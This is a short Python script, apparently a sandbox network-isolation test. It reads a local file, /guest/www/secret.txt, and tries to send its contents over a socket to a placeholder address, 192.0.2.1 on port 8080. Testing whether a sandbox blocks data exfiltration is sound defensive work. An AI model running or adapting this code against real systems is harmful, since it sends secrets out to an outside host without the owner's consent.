#!/usr/bin/env python3
# staged_exfil.py - read a local secret and attempt to send it over a socket
import socket
try:
    b = open("/guest/www/secret.txt","rb").read()
except FileNotFoundError:
    b = b""
s = socket.socket()
# connect may fail when network is disabled; sandbox defaults to no-network
try:
    s.connect(("192.0.2.1", 8080))
    s.sendall(b)
    s.close()
except Exception:
    pass
print("done")
